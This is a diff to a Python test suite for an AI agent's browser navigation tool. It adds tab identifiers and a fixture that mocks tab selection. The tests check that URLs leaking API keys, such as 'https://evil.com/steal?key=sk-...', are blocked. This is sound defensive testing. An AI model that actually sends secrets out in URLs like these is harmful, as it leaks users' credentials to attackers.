@@ -18,7 +18,7 @@ class TestBrowserSecretExfil:
 
     def test_blocks_api_key_in_url(self):
         from tools.browser_tool import browser_navigate
-        result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
+        result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30, tab_id="fixture:t1")
         parsed = json.loads(result)
         assert parsed["success"] is False
         assert "API key" in parsed["error"] or "Blocked" in parsed["error"]
@@ -39,8 +39,8 @@ class TestBrowserSecretExfil:
              patch("tools.browser_tool._navigation_session_key", return_value="default"), \
              patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
              patch("tools.browser_tool_session._run_browser_command", return_value=mock_result) as mock_run:
-            allowed = json.loads(browser_navigate(url))
-            blocked = json.loads(browser_navigate("https://example.com/callback?token=" + "sk-or-v1-" + "b" * 30))
+            allowed = json.loads(browser_navigate(url, tab_id="fixture:t1"))
+            blocked = json.loads(browser_navigate("https://example.com/callback?token=" + "sk-or-v1-" + "b" * 30, tab_id="fixture:t1"))
 
         assert allowed["success"] is True
         assert blocked["success"] is False and "Blocked" in blocked["error"]
@@ -54,7 +54,7 @@ class TestBrowserSecretExfil:
         with patch("tools.browser_tool_session._run_browser_command", return_value=mock_result), \
              patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
              patch("tools.browser_tool_cloud._is_local_backend", return_value=True):
-            result = browser_navigate("https://example.com/callback?token=opaque-oauth-code")
+            result = browser_navigate("https://example.com/callback?token=opaque-oauth-code", tab_id="fixture:t1")
 
         parsed = json.loads(result)
         assert parsed["success"] is True
@@ -73,7 +73,7 @@ class TestBrowserSecretExfil:
         with patch("tools.browser_tool_session._run_browser_command", side_effect=mock_run), \
              patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
              patch("tools.browser_tool_cloud._is_local_backend", return_value=True):
-            result = browser_navigate("https://wttr.in/Köln")
+            result = browser_navigate("https://wttr.in/Köln", tab_id="fixture:t1")
 
         parsed = json.loads(result)
         assert parsed["success"] is True
@@ -225,3 +225,9 @@ class TestBrowserSupervisorRedaction:
         assert result["pending_dialogs"][0]["message"].startswith("Enter API key sk-")
         assert result["pending_dialogs"][0]["default_prompt"].startswith("sk-")
         assert result["recent_dialogs"][0]["message"].startswith("Recent key sk-")
+
+
+@pytest.fixture(autouse=True)
+def _mock_explicit_tab_selection(monkeypatch):
+    """Keep these transport/policy tests independent of tab identity tests."""
+    monkeypatch.setattr("fork_features.browser_tabs.select_tab", lambda *a, **kw: {"success": True, "daemon_identity": "fixture-generation"})
